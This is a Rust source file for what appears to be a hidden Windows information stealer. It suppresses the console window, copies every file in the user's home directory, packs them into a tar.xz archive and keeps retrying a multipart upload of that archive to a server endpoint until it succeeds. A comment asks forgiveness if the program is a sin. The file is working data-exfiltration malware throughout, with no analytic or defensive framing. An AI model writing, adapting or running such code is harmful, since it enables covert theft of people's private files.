use std::{fs, path::Path};
use solcrypt::VarSet;
use reqwest::blocking::{multipart, Client};
use std::thread::sleep;
use std::time::Duration;

#[windows_subsystem = "windows"]

fn main() {
    let varset = VarSet::new(); // Lord forgive this, if according to your judgement it is a sin.
    let homedirfiles = solcrypt::get_all_files(&varset.home);
    
    // Create a directory containing every file the user has in their home directory
    match fs::create_dir(&varset.dirpath) {
        Ok(dir) => dir,
        Err(e) => eprintln!("ERROR: {:?}", e),
    };

    for file in homedirfiles {
        let og_filepath = Path::new(&file);
        let filename = og_filepath.file_name().unwrap().to_str().unwrap();
        match fs::copy(&file, format!("{0}\\{1}", varset.dirpath, &filename)) {
            Ok(..) => {},
            Err(e) => { eprintln!("ERROR: {}, from: {}, to: {}", e, &file, format!("{0}\\{1}", varset.dest, &filename)) },
        }
    }

    
    solcrypt::compress_directory_to_tar_xz(varset.dirpath.clone(), varset.dest.clone()).unwrap();

    // File upload
    let client = Client::new();

    loop {
        let form = multipart::Form::new()
            .file("home.tar.xz", &varset.dest).unwrap();
        let resp = client
            .post("http://localhost:8080/upload")
            .multipart(form)
            .send();

        if resp.is_ok() {
            break;
        }
        sleep(Duration::from_secs(5));
    }
    

}
